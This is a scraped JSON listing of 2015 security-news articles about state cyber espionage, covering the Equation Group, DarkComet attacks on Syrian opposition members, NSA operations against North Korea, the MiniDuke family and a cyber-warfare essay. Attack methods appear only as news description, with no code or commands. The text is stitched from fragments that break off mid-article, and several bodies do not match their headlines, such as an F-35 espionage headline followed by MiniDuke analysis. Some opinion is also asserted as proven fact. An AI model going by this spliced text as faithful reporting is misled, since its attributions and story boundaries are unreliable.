{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/data-exfiltration", "topic_name": "Data exfiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sabotage", "topic_name": "Sabotage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}]}, {"news_name": "US State Department \u2013 Hackers still in the Email System", "news_link": "https://securityaffairs.co/wordpress/33982/cyber-crime/us-state-department-hack.html", "title": "US State Department \u2013 Hackers still in the Email System\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 23, 2015", "body": "In November 2014 the State Department has taken the unprecedented step of shutting down its entire unclassified email system in response to a suspected cyber attack.\n\n\u2018Activity of concern\u2019 was detected in the system concurrently with another cyber attack which hit the network at the White House computer network. A State Department staffer answering a call to the State Department Operations Center revealed that, as a precautionary measure, the e-mail system remained down.\n\nIn the same period, other US agencies were targeted by hackers, including the U.S. Postal Service and the National Weather Service, the U.S. Military confirmed that its systems were secured, according to official sources, none of the State Department\u2019s classified systems were affected.\n\nThe State Department personnel were asked to stop using official emails and use Gmail instead.\n\nIn November, Government officials reported to the ABC News agency that hackers have compromised computing systems in many nation\u2019s critical infrastructure. The attackers have infected the software that runs in the critical infrastructure with a malware, the circumstance creates a lot of anxiety in Intelligence and military industry due to the vital role of the hacked architecture. Sources reported to the news agency that the attacks appear to be state-sponsored hacking campaign and that the Russia is the nation that is coordinating them.\n\nReturning to the present, three people familiar with the investigation at the State Department have reported to the Wall Street Journal that the US Government is still working to sanitize the email systems of the State Department. The circumstance is very concerning because the hackers still have access to the network of the Government Agency.\n\n\u201cThree months after the State Department confirmed hackers breached its unclassified email system, the government still hasn\u2019t been able to evict them from the department\u2019s network, according to three people familiar with the investigation.\u201d states the Wall Street Journal.\n\nThe US intelligence is trying to fight back the hackers and track them, but it is an ongoing battle that foreign attackers are winning because they are still able to find new entry points in the US networks.\n\n\n\nThe sources explained that US authorities are still investigating the data breach and in time I\u2019m writing they still haven\u2019t a clear picture of the overall data accessed by the hackers.\n\n\u201cWe deal successfully with thousands of attacks every day,\u201d State Department spokeswoman Marie Harf said in an official statement. \u201cWe take any possible cyber intrusion very serious as we did with the one we discussed several months ago and we deal with them in conjunction with other relevant government agencies.\u201d\n\nWho is behind the attack?\n\nThe investigation was conducted by FBI and Secret Service, the authorities speculate that the attacks were coordinated by a foreign government, Russia or China were among the primary suspects. Experts involved in the investigation reveals that Russia remains the first suspect because of the similarity of the malware used in the attack and the malicious code used in other attacks worldwide linked to Russian state-sponsored operations, including the recent attacks following the Ukraine crisis.\n\nThe nature of the attack suggests that it may have originated in Russia, one of the officials said. A former U.S. intelligence official said that country has developed cyber-espionage capabilities that are almost equal to those of the U.S. National Security Agency.\n\n\u201cThe intrusions coincide with rising tensions between the U.S. and Russia, and hackers linked to the government of Russian President Vladimir Putin have used the same \u201cphishing\u201d technique, in which the opening of deceptive e-mail attachments downloads malicious software, to attack other unclassified U.S. government e-mail systems.

The necessity for effective methods that work against cyber crime has made a lot of people call for a project of similar use. The US has been trying to come up with a truly efficient way of knowing what happens online and a project seeking such information seems like the perfect medium to accomplish just that.\n\nAccording to Marc Goodman from Medium, a cyber Manhattan Project would be the best tool to make use of online:\n\n\u201cThis Manhattan Project would help generate the associated tools we need to protect ourselves, including more robust, secure, and privacy-enhanced operating systems. Through its research, it would also design and produce software and hardware that were self-healing and vastly more resistant to attack and resilient to failure than anything available today. Such a project of national and even global importance would have the vision, scope, resources, budgetary support and perhaps most importantly, a real sense of urgency required in order to make it a success.\u201d\n\nBased on the remarks made by the President Barack Obama at the Cybersecurity and Consumer Protection Summit, there is ground on which such a project could be built and prosper over time:\n\n\u201cWe all know what we need to do. We have to build stronger defenses and disrupt more attacks.\u201d \n\nHowever, such comments about future plans come to contradict the recent revelations that have pointed out the existence of a cyber Manhattan Project from as early as 2001 in the United States. The Equation Group, which appears to be directly linked to it, has been embedding hostile malware to intelligence agencies and Governmental sources abroad (in Russia, China and Iran).  The breaking news was brought to light in Mexico during the Kaspersky Security Analyst Summit that is held on an annual basis.\n\nOf course, such news highlights a very different approach as to the actual reason why the NSA (and the United States in general) would wish to embrace a cyber Manhattan Project. Unlike the initial statement that leads us to assume that the main cause of setting up such a project would be to defend the country against hostile acts, it is now proven that the main reason is none other than cyber espionage. The malware has been dormant or moving slowly and this is why it has remained undetected for so long.\n\n\n\nThe deployment made by the NSA has been taking a lot of time, offering a camouflage and the opportunity not to raise suspicions. Based on the extent of interest by the NSA, the agency decides whether to proceed or not with the following steps that involve gathering of information and possible revelation of the malware.\n\nIf you combine the revelations made by Kaspersky and the continuous revelations by Edward Snowden along with the gigantic budget of US agencies like the NSA (with about $10.8 billion), you can connect the dots. A much better strategic plan for attacking foreign countries and their cyber space is of top priority for the United States, since there is a growing need for obtaining crucial online data and monitoring what the others do in the form of leverage.\n\nWritten by: Ali Qamar, Founder/Chief Editor at SecurityGladiators.com\n\nAuthor Bio:\nAli Qamar is an Internet security research enthusiast who enjoys \u201cdeep\u201d research to dig out modern discoveries in the security industry.

In the arsenal of the hacking crew there were sophisticated tools that according to the experts requested a significant effort term of development, Kaspersky sustains that the Equation Group has also interacted with operators behind Stuxnet and Flame. Based on the elements collected on the various cyber espionage campaigns over the years, the experts hypothesize that the National Security Agency (NSA) could be linked to the Equation Group.\n\n\u201cThere are solid links indicating that the Equation Group has interacted with other powerful groups, such as the Stuxnet and Flame operators\u2014generally from a position of superiority,\u201d states the report released at by Kaspersky during the company\u2019s Security Analyst Summit in Cancun, Mexico on Monday.\n\nThe researchers explained that the Equation Group is a \u201cthreat actor that surpasses anything known in terms of complexity and sophistication of techniques,\u201d.\n\nIt is singular that the Equation Group also had access to zero-days before they were used by operators behind Stuxnet and Flame campaign, the experts at Kaspersky Lab explained that on seven exploits used by the Equation group in their malicious codes, at least four of them were used as zero-days. A malware dubbed Fanny used in 2008 exploited two zero-days which were later introduced into Stuxnet variant detected in June 2009 and March 2010.\n\n\u201cAt least four of these were used as zero-days by the EQUATION group. In addition to these, we observed the use of unknown exploits, possibly zero-day, against Firefox 17, as used in the TOR Browser. An interesting case is the use of CVE-2013-3918, which was originally used by the APTgroup behind the 2009 Aurora attack. The EQUATION group captured their exploit and repurposed it to target government users in Afghanistan.\u201d\n\nAccording to Kaspersky team, the Equation Group has infected thousands, \u201ceven tens of thousands,\u201d of victims worldwide, Kaspersky has collected evidence of the attacks in more than 30 countries, among the victims belong to the following categories:\n\n\n\nThe Equation Group relies also on physical attacks on its victims, according to the reports the hackers in order to infect victims have sent them a malware-infected CD in the mail and intercepted a Cisco Systems router in the mail to implant Trojans in the firmware. The attack technique is known as \u201cinterdiction\u201d and consists in the interception shipped goods and replacement with Trojanized versions.\n\n\u201cThe attacks that use physical media (CD-ROMs) are particularly interesting because they indicate the use of a technique known as \u201cinterdiction\u201d, where the attackers intercept shipped goods and replace them with Trojanized versions.\u201d continues the report.\n\nThe Equation group relies on multiple attack techniques to compromise victims\u2019 computers, including:\n\nThe Equation Group library includes a very sophisticated keylogger called \u201cGrok,\u201d, a name that is not new to the experts  and that was mentioned in the documents leaked by Snowden. Also other codes mentioned in the report, \u201cSTRAITACID\u201d and \u201cSTRAITSHOOTER\u201d, appears quite similar to \u201cSTRAITBIZARRE,\u201d, the advanced hacking platform used by the NSA\u2019s Tailored Access Operations unit.\n\n\u201cThe codename GROK appears in several documents published by Der Spiegel, where \u201ca keylogger\u201d is mentioned. Our analysis indicates EQUATIONGROUP\u2019s GROK plugin is indeed a keylogger on steroids that can perform many other functions.\u201d reads the report.\n\nThe report includes the names of some the attack tools and malware the Equation group used, including EquationLaser, EquationDrug, DoubleFantasy, TripleFantasy, Fanny and GrayFish.\n\nThe Fanny worm was considered one of the most interesting weapons in the hacking arsenal of the team, the malware was used by the hackers to map air-gapped networks. The worm was designed to map the topology of a targeted network and to execute commands to these isolated systems by exploiting compromised USB devices.\n\n\u201d For this, it used a unique USB-based command and control mechanism. When a USB stick is infected, Fanny creates a hidden storage area on the stick. If it infects a computer without an internet connection, it will collect basic system information and save it onto the hidden area of the stick. Later, when a stick containing hidden information is plugged into an internet-connected computer infected by Fanny, the data will be scooped up from the hidden area and sent to the C&C. If the attackers want to run commands on the air-gapped networks, they can save these commands in the hidden area of the USB stick. When the stick is plugged into the air-gapped computer, Fanny will recognize the commands and execute them\u201d\n\n\n\nThe experts at Kaspersky were able to recover two modules which allowed the group to reprogram hard drive firmware of more than a dozen of the popular hard disk drive brands, including Western Digital, Maxtor, Samsung, IBM, Micron, Toshiba, and Seagate. As explained by the researchers the malware was able to survive disk formatting and OS reinstallation.\n\n\u201cIt means that we are practically blind, and cannot detect hard drives that have been infected by this malware,\u201d said Costin Raiu, Director of the Global Research and Analysis Team at Kaspersky Lab.  \u201cIt can resurrect itself forever,\u201d .\n\nI strongly suggest you to read the report , it is amazing and full of interesting information \u2026 I will go deep to discover further links with data disclosed previously.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  The Equation Group, ATP)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/atp", "topic_name": "ATP"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espione", "topic_name": "cyber espione"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/fanny", "topic_name": "Fanny"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/interdiction", "topic_name": "interdiction"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/kaspersky", "topic_name": "Kaspersky"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nsa", "topic_name": "NSA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/tao", "topic_name": "TAO"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/the-equation-group", "topic_name": "The Equation Group"}]}, {"news_name": "British army creates the 77th battalion to fight through social networks", "news_link": "https://securityaffairs.co/wordpress/33552/social-networks/british-army-77th-battalion-facebook.html", "title": "British army creates the 77th battalion to fight through social networks\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 15, 2015", "body": "The documents leaked by Edward Snowden demonstrate that the NSA and its allies are now preparing for future dominance in cyberspace.

They operated deep behind Japanese lines in Burma between 1942 and 1945 and their missions were often of questionable success.\u201d reported the Financial Times.\n\nThe group will use social networks like Faceboo and Twitter to monitor their opponents, the information they produce and to run PSYOPs.\n\n\n\nThe British army will assign more than 1,500 specialists to the new troop that will use popular social networks to spread disinformation, run intelligence operations and disclose real war truths.\n\n\u201cThe 77th Brigade, to be based in Hermitage, near Newbury, in Berkshire, will be about 1,500-strong and formed of units drawn from across the army. It will formally come into being in April.\u201d reported the Guardian. \u201cThe 77th will include regulars and reservists and recruitment will begin in the spring. Soldiers with journalism skills and familiarity with social media are among those being sought.\u201d\n\nThe 77th battalion will reportedly begin its activity in April 2015. The decision of the British Government to create the 77th battalion cyber unit follows a similar initiative of other governments that are using social networks to run cyber espionage campaigns, spread disinformation or influence the human sentiment about specific topics.\n\n\u201c77th Brigade is being created to draw together a host of existing and developing capabilities essential to meet the challenges of modern conflict and warfare. It recognises that the actions of others in a modern battlefield can be affected in ways that are not necessarily violent.\u201d said an army spokesman. \n\nAs reported by the Guardian, both the Israeli and US army have already dedicated internal staff to psychological operations run through social networks.\n\nAn Israel Defense Force spokesperson revealed that the IDF used 30 different social media sites in several different languages during Operation Cast Lead in an effort to \u201cengage with an audience we otherwise wouldn\u2019t reach.\u201d\n\nThe experts will have to monitor threat actors that exploit social networks to arrange their offensive and run propaganda activities.

The progression of this concept brings us to the next milestone, to define which global actors benefit the most from this capability. The feasibility of offensive cyber warfare capability of the weaker states against states with stronger kinetic warfare capability grants them a strategic advantage and enables them to change the balance of power in their advantage. Offensive cyber warfare capability is a sound strategic balancing factor that potentially will be utilized by the rising/challenging hegemon against the hegemon. The attractiveness of cyber warfare for the weaker state is due to its low cost of development and deployment, its minimum visibility during development and mobilization as a weapon, attribution, globalization of information and global accessibility of technology and the fact that stronger states are more dependent on their critical cyber infrastructure.\n\nUnderstanding the effectiveness of the strategic culture and utilization of cyber warfare capability by the challenging/rising hegemon against the hegemon will have consequences on U.S. national security doctrine. United States as one of the most \u201cwired\u201d states in the world shows a potential vulnerability against cyber-attacks. Globalization -fueled by technological advancement and spread of cyber space in physical space- is a manifestation of new means through which power is exercised and distributed. On the same token such power comes with a vulnerability that states such as North Korea and China are trying to separate themselves from by keeping their critical infrastructure isolated from internet reach. Cyber Warfare is a unique case, the more you have invested and expanded on your capabilities in cyberspace more vulnerable you are.\n\n\n\nThe exponential growth of internet and dependence of our critical infrastructure to cyber space (i.e. power grids, emails, emergency systems, reconnaissance networks, military communication, weapons and etc.) begs the question; can cyber warfare be the dominant dimension for interstate conflicts in the future?  Consequentially the next question that needs to be addressed is that in the context of international theory which group of states benefit the most strategically from offensive cyber warfare capability? This study argues that, considering the fact that a rising regional hegemon such as China does not have kinetic war (traditional weapons) capability that equates to the U.S. advanced military forces; offensive cyber warfare becomes a sound balancing factor against this asymmetric relationship.\n\nOne may argue that there is still a significant \u201cdigital gap\u201d between haves (having strong technological and cyber capabilities) and have-nots, attributing a stronger cyber warfare capability to states with stronger military and technological advantage. However the difference between developing a strong cyber warfare capability and nuclear capability is substantial. It takes less economic, human and geo-political resources to develop cyber-attack capability than nuclear capability. This becomes a fundamental assumption in comparing nuclear capability and cyber war potential. Realist scholars argue that nuclear capability is the absolute form of military power that provides security for proliferated states.\n\nCyber war capability presents a different aspect of this argument, the strategic capability embedded in lack of attribution of the source of a cyber attack, secretive aspect of information operations and the fact that a large scale computer network attack (CNO) can be launched from a small facility with least amount of visibility allows for cyber warfare to be a viable front for challenging rising hegemons.\n\nTo understand the effectiveness of cyber warfare especially for states with a smaller conventional arms forces and less technologically advanced military one should study the basics of the asymmetric warfare. Cyber warfare capability provides an important strategic advantage in an asymmetric warfare to the weaker party. Realistically the perfectly symmetric warfare does not exist, particularly when the United States is involved. However cyber warfare may be more asymmetric than other strategic weapons. The U.S. economy and society are heavily networked; so is its military. On the other hand the attacker, by contrast, may have no targets of consequence, either because it is not particularly \u201cwired\u201d, because its digital assets are not networked to the outside world, or because such assets are not terribly important to its government. In the case of North Korea and US the asymmetric characteristics of the cyber warfare has major significance.For instance, the strategic culture of North Korean military by nature will allow for cyber warfare to become a central ability of the arms forces, due to its low cost of deployment, covert nature of the weapon and attribution. Highly asymmetric outcomes are possible when cyber warfare is utilized. A weaker challenging state like North Korea may mobilize enough clever people to do serious damage to a state that is richer and more high-tech but that is taking into account that the attacked state is more dependent on its information infrastructure. In the case of U.S. it is arguable that this requirement is satisfied and U.S. is one of the advanced states in the world that is moving towards full cyber capability. Similar aggression in conventional warfare would lead to crushing defeat of the smaller state by the hegemon.\n\nOne may argue that U.S. being a more wired state, and arguable the strongest state by far from its rivals in technology also holds a strong ground in cyber defense. But it is important to note that the inherent characteristic of the cyberspace favors the attacker, not the defender. Furthermore, unlike conventional or nuclear war, a cyber-attack is not always obvious. It may take years to identify an attack and by that time the source of attack may have been disappeared from the cyber space. Additionally, the responsibility for defending the nation against a cyber-attack spreads across many federal agencies and the private sector, which complicates congregating a coherent response to an attack. Internet has provided a uniform platform connecting public and private sector, making defense and deterrence a daunting task. Further, from a defensive perspective, it is difficult to imagine how to defend a space that has no boundaries. Also, based on its design, internet changes constantly, grants access to anyone, and exists virtually everywhere. Even so-called closed networks, such as those that are not connected to the Internet (i.e., air-gapped networks) are still at risk from the manual insertion of malware (by means of portable storage devices as in the case of Natanz Nuclear Plant in Iran); even wireless code insertion, transmitted over radio or radar frequencies, is easy to access and tamper with. Now that we have identified that defense is a complex algorithm that reduces its accuracy in cyber security let\u2019s review the potential ramifications of a cyber-attack by a weaker state.\n\nWhat makes cyber warfare effective and viable for the weaker state? In the current anarchic international system of governance, considering the fact that U.S. has by far the strongest conventional military force, what strategies can be used by weaker states to keep the balance of power?\n\nCyber warfare capability as a strategic weapon for countries such as North Korea seems to be the most viable option. The low cost of entry (for example, a personal computer connected to the Internet), and the ability to operate anonymously, and the problem with attributing an attacker to a cyber-attack are factors that makes cyberspace attractive to adversaries who know they cannot challenge the United States in a symmetrical contest. Potential adversaries, such as Iran and North Korea, are reportedly developing capabilities to attack or degrade U.S. civilian and military networks. \u201cMoonlight Maze\u201d and \u201cTitan Rain\u201d are examples of successful attacks against non-classified military systems which DOD officials claim were directed by other governments. According to the Defense Department\u2019s annual report to Congress on China\u2019s military ability, the Chinese military alongside states such as Iran and North Korea are enhancing their information operations and cyber offense capabilities.\n\nIn a kinetic warfare scenario, deterrence has an important role. Fear of retaliation makes the attacker to pause and think twice. In the case of cyber warfare deterrence has not been an effective strategy for the U.S. there are over 20 to 30 nations that have already established offensive cyber units so we apparently did not deter them. North Korea being one of these states has recently ramped up its investment on cyber warfare capability development. Also from a cost analysis standpoint the case for cyber deterrence generally rests on the assumption that cyber-attacks are cheap and that cyber-defense is expensive. As Martin Libick states:\n\n\u201cJust as nuclear era spawned policies of deterrence that, although elaborate, were successful or at least not challenged, today\u2019s era needs a doctrine of cyber deterrence.\u201d\n\nThe problem with deterrence is that countries are not equally vulnerable to cyber-attacks, thus cyber retaliations or balancing will not be the same as equalization of nuclear warfare capabilities.  The aim of deterrence is to create disincentives for starting or carrying out further hostile action however in the case of cyber-attack this notion is hard to achieve. Deterrence also requires the adversary to be able to distinguish between being punished from not being punished. In most realms this is not a problem, however for cyber warfare this is a major problem. The raw calculus of deterrence is fairly straightforward: The lower the odds of getting caught, the higher the penalty required convincing potential attackers that what they might achieve is not worth the cost. Unfortunately, the higher the penalty for any one cyber-attack, the greater the odds that the punishment will be viewed as uneven, this by nature can be contributed to the attribution problem inherently embedded in the cyber warfare capability.\n\nCyber warfare capability is a new arena in strategic studies and it surely requires thorough understanding of the technical and political elements of this phenomenon. Cyber space is not solely developed and defended by the sovereign states and many non-governmental stake holders are involved in deployment of this virtual world. It is imperative for the U.S. government and the international community to consider cyber warfare as a weapon for rogue states and those actors that need its capabilities to gain economic and political advantage against the dominant political structure.\n\nAbout the Author\n\nArtin Amirian is an IT infrastructure engineer with extensive education in Computer Science, Economics and International Political Economy.

The troops of the Syrian opposition \u201ccarefully laid out their objective\u201d saving their plans electronically as pictures. The Syrian opposition planned for a battle involving between 700 and 800 opposition forces.\n\nThe hackers infected the machines of Syrian opposition with malware during flirtatious Skype chats.\n\nThe hackers targeted several exponents of the Syrian Opposition located in Syria, including armed opposition members, humanitarian aid workers, and media activists.\n\n\u201cThe threat actors used female Skype avatars to chat with their targets and infect their devices with malware. \u201cShe\u201d typically asked her intended victim if he was using Skype on an Android or a computer, in a likely attempt to send malware tailored to the device. The threat group also maintained a seemingly pro-opposition website containing links to malicious downloads and Facebook profiles with malicious links as well. They conducted these operations using servers located outside of Syria.\u201d states the report.\n\nthe hackers syphoned nearly 7.7GB of material, including 64 Skype databases, 31,107 conversations, 12,356 contacts and 240,381 messages.\n\n\n\nLaura Galante, manager of threat intelligence at the computer security firm, explained that the investigation on the specific case started last year, while the experts at FireEye were researching PDF-based malware discovered a server containing documents and files.\n\nDespite the operation appeared very complex, the hackers made their resounding mistakes \u2026  or they have them such errors intentionally to throw us off. The server that was hosting the file was not password protected and exposed to the Internet.\n\nThe documents discovered on the server included annotated satellite images, Skype chats, weapons records and personal information of exponents of the Syrian opposition. The victims were contacted by the hackers through Skype, they concealed their identity behind fake profiles of attractive women sympathetic to their cause.\n\nThe hackers used specific attack vector depending on the OS used by victims, in some cases the \u201cattractive women\u201d requested to the victims to swap a photo. In reality, the hackers sent the victims a self-extracting RAR archive that was renamed with a \u201c.pif\u201d file extension.\n\n\u201cThe avatar would request a photo of the target, then send a \u201cpersonal photo\u201d of a woman in return. The avatar\u2019s \u201cphoto\u201d was actually an executable file (a self-extracting RAR archive) renamed with the .pif file extension.3 When the victim \u201copened\u201d the photo, a woman\u2019s picture was displayed while the SFXRAR executed and ultimately installed the DarkComet RAT in the background. From this point on, the victim\u2019s computer was under the threat group\u2019s control\u201d states the report.\n\nAccording to Galante, the hackers also improved the DarkComet RAT with evasion techniques in order to remain under the radar.\n\nAnother element that distinguished this campaign against the Syrian Opposition is the capability of attackers to compromise Android device with a malware. Smart phones are a privileged target for hackers that can collect a huge quantity of data by compromising their mobile devices.\n\n\u201cSmart phones, in general, are valuable sources of data about individuals and their social networks, as they may contain address books, SMS messages, email, and other data (including data from mobile apps, such as Skype). Targeting Android may be particularly beneficial in the case of Syrian opposition members, where regular power blackouts in Syria may force people to rely more heavily on mobile devices for communications. Despite the wide array of tools and techniques at their disposal, the threat group does not appear to use software exploits to deliver malware to their targets. Instead, they seem to rely on a variety of social engineering techniques to trick victims into infecting themselves.\u201d\n\nThe report confirmed that despite a small number of devices were infected, the hackers compromised multiple accounts of people that shared the mobile devices.\n\nThose infected were \u201cdefinitely organizers and strategists behind different battles,\u201d Galante said. \u201cThese weren\u2019t just low-level guys.\u201d\n\nWho are the culprits?\n\nThe report confirms that while researchers have only limited indications about the origins of the threat actors, the investigation revealed multiple references to Lebanon.\n\nJust for your information the server was shut down by the ISP hosting it shortly after FireEye\u2019s findings.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 FireEye, Syrian Opposition)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/darkcomet", "topic_name": "DarkComet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/fireeye", "topic_name": "FireEye"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/lebanon", "topic_name": "Lebanon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rat", "topic_name": "RAT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/syria", "topic_name": "Syria"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/syrian-opposition", "topic_name": "Syrian Opposition"}]}, {"news_name": "Alleged Lizard Squad members hacked Malaysia Airlines.

Especially after the new revelations from Edward Snowden and the reports from Der Spiegel, with the voice of Jacob Appelbaum and others, suspicion has been raised and nobody believes that North Korea is to blame for everything turning bad in the world. It is customary on behalf of the NSA to be linked to tactics of unauthorized surveillance, with the example of last year\u2019s report proving that the Agency has backdoors for a number of different devices toward collecting data.\n\nA new wave of documents, leaked by Edward Snowden and published by the Der Spiegel magazine, demonstrates how the NSA has used its servers as hacking platforms (i.e. FOXACID) to hack in the system of foreign governments by implanting a malware. Other components involved in the attacks are Turbine and Turmoil, belonging to the Turbulence family exploitation systems. According to Snowden, the NSA also secretly tapped into South Korean network espionage on North Korean networks to collect information.\n\n\u201cSpurred by growing concern about North Korea\u2019s maturing capabilities, the American spy agency drilled into the Chinese networks that connect North Korea to the outside world, picked through connections in Malaysia favored by North Korean hackers and penetrated directly into the North with the help of South Korea and other American allies, according to former United States and foreign officials, computer experts later briefed on the operations and a newly disclosed N.S.A. document.\u201d reports The New York Times.\n\nThe NSA hackers compromised the North Korean systems by spreading malicious code through spear phishing campaigns:\n\n\u201cThe N.S.A.\u2019s success in getting into North Korea\u2019s systems in recent years should have allowed the agency to see the first \u201cspear phishing\u201d attacks on Sony \u2014 the use of emails that put malicious code into a computer system if an unknowing user clicks on a link \u2014 when the attacks began in early September, according to two American officials.\u201d\n\n \n\n\n\n \n\nOne of the hacking scenarios described in the documents leaked by Snowden describes how the NSA\u2019s Tailored Access Office hijacked a botnet known by the codename \u201cBoxingrumble\u201d that initially was used to target the computers of Chinese and Vietnamese dissidents and was being used to target the DOD\u2019s unclassified NIPRNET network.\n\n\u201cThe NSA was able to deflect the attack and fool the botnet into treating one of TAO\u2019s servers as a trusted command and control (C&C or C2) server. TAO then used that position of trust, gained by executing a DNS spoofing attack injected into the botnet\u2019s traffic, to gather intelligence from the bots and distribute the NSA\u2019s own implant malware to the targets.\u201d reports ArsTechnica.\n\n\n\n \n\n \n\n\n\nBased on the new leaks from the world-renowned whistleblower Edward Snowden, the NSA is preparing the USA for digital wars. The Agency has been building its defensive line and asking for people who enjoy breaking things to join their cause. As it seems, thorough preparation is taking place for the digital wars to come \u2013 the Internet is certain to play a crucial role to the wars of the future, after all. In order to prevail, they have been aiming to the establishment of the innovative and extremely powerful D weapons (with D referring to Digital), after the Atomic, Biological and Chemical ones of the past.\n\nJames A. Lewis is an expert in cyberwarfare working at the Center for Strategic and International Studies in Washington. He commented on the determination and certainty of Barack Obama to accuse North Korea of the recent Sony hack:\n\n\u201cAttributing where attacks come from is incredibly difficult and slow. The speed and certainty with which the United States made its determinations about North Korea told you that something was different here \u2014 that they had some kind of inside view.\u201d \n\nSuch haste and lack of doubt surely raise an eyebrow as to how the United States of America have managed to get solid proof of North Korea\u2019s guilt on the matter.\n\nDer Spiegel brought to public attention another top secret document, which reveals that the NSA obtained data from places like North Korea. The document sheds light on the methods used by spying agencies worldwide, with information collected one way or another and data transferred to various destinations. As a result, all the revelations agree that the NSA has been accurate and to the point toward penetrating one of the most powerful systems in the world and that the data collected is meant to help in cases of cyberwarfare.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 North Korea, malware)\n\n", "topics": ""}, {"news_name": "Snowden reveals that China stole plans for a new F-35 aircraft fighter", "news_link": "https://securityaffairs.co/wordpress/32437/intelligence/china-stole-plans-f-35-aircraft.html", "title": "Snowden reveals that China stole plans for a new F-35 aircraft fighter\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 19, 2015", "body": "The documents leaked by Edward Snowden are a precious source of information, the last collection of confidential files have uncovered revealed a new large-scale industrial espionage campaign conducted by the Chinese Government.

Analyzing the logs from the command servers security the experts have found 59 unique victims in 23 countries.\n\nCosmicDuke: In April 2014, experts at F-Secure, while investigating on MiniDuke malicious code discovered a link to a new strain of malware, dubbed CosmicDuke, belonging to Cosmu family. The malware family discovered was using the same loader as MiniDuke stage 3.\n\n\n\nOnionDuke: In November 2014, experts Josh Pitts of Leviathan Security Group identified a Russian Tor exit node that was patching the binaries downloaded by the users with malware. Experts at F-Secure discovered a link between the crew operating the rogue Tor node that was used to spread the OnionDuke malware and the MiniDuke APT. The malware was any way different from the ones used in the past by the threat actor behind the MiniDuke crew. The OnionDuke has been used in attacks against government agencies and mass infection campaigns against Tor and torrent users.\n\nThe researchers at F-Secure have analyzed malicious documents uploaded to the Free Online Virus, Malware and URL Scanner service VirusTotal, and have discovered that at least one the Ministry of Foreign Affairs in Europe has been the victim of a targeted attack. The documents used for the cyber espionage campaign against the Ministry of Foreign Affairs in Europe reference the EU sanctions against Russia over the crisis in Ukraine, the attackers used social engineering tactics to trick users into enabling macros, a necessary step to allow the CosmicDuke infection.\n\n\n\nThis sample of CosmicDuke analyzed by the experts was specifically designed to install MiniDuke malware on infected systems.\n\n\u201cIn our analysis released in July we mentioned that CosmicDuke seems to be connected to MiniDuke because both malware families use the same loader which has been exclusively used by the MiniDuke group. The CosmicDuke samples that infect the system with MiniDuke give us further evidence that the same actor is behind both malware families.\u201d reports F-Secure in a Blog post.\n\nInitially CosmicDuke was initially linked to MiniDuke because the researchers discovered that the two malicious code was using the same loader, the new discovery confirms the suspect.\n\n\u201cCosmicDuke and MiniDuke complement each other. CosmicDuke is an infostealer \u2013 ideal for reconnaissance and data exfiltration. MiniDuke is a backdoor \u2013 it gives the attacker full control of the computer,\u201d Timo Hirvonen, senior researcher at F-Secure explained to SecurityWeek.\n\nThe experts highlighted that CosmicDuke has been observed in operations targeting government entities, high-profile organizations, and users involved in the trafficking of controlled and illegal substances.\n\nThe researchers at F-Secure revealed that in APT campaigns, the attackers used a dedicates infrastructure for OnionDuke that\u2019s shared with MiniDuke. In these cases, the threat actors used a full version of the malware. The experts also noticed that in the mass infection campaigns, the C&C infrastructure was relying on compromised servers and free hosting services, and in these cases, the attackers have used a lighter version of OnionDuke.\n\nWho is behind the cyber espionage campaigns?\n\nThe experts speculated that CosmicDuke, MiniDuke and OnionDuke are the products of Russian state-sponsored hackers because the campaigns targeted governments with an interest in Russian affairs. The fact that CosmicDuke operations targeted users of illegal substances may also indicate the involvement of law enforcement agencies of the Russian Government.\n\nStay Tuned.\n\n \n\nPierluigi Paganini\n\n(Security Affairs \u2013  MiniDuke, CosmicDuke , OnionDuke)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/backdoor", "topic_name": "backdoor"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cosmicduke", "topic_name": "CosmicDuke"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/f-secure", "topic_name": "F-Secure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/information-warfare", "topic_name": "Information Warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": 